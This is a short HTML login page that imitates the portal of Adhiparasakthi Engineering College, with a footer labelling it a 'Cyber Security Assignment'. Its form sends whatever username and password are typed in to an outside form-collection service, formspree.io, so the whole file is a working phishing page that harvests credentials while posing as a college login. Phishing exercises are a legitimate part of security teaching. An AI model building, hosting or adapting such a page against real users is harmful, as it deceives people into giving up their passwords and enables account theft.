<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Adhiparasakthi Engineering College Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:linear-gradient(135deg,#004080,#66b3ff);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.login-box{
    width:380px;
    background:#fff;
    padding:30px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 0 20px rgba(0,0,0,0.3);
}

.login-box img{
    width:100px;
    height:100px;
    margin-bottom:15px;
}

h2{
    color:#003366;
    margin-bottom:20px;
    font-size:24px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    background:#003366;
    color:white;
    border:none;
    border-radius:8px;
    font-size:18px;
    cursor:pointer;
}

button:hover{
    background:#0055aa;
}

.footer{
    margin-top:15px;
    font-size:13px;
    color:#555;
}
</style>

</head>

<body>

<div class="login-box">

<img src="logo.jpg.jpg" alt="College Logo">

<h2>Adhiparasakthi Engineering College</h2>

<form action="https://formspree.io/f/mpqgbngb" method="POST">

<input
type="text"
name="Username"
placeholder="Enter Username"
required>

<input
type="password"
name="Password"
placeholder="Enter Password"
required>

<button type="submit">
Login
</button>

</form>

<div class="footer">
Cyber Security Assignment
</div>

</div>

</body>
</html>
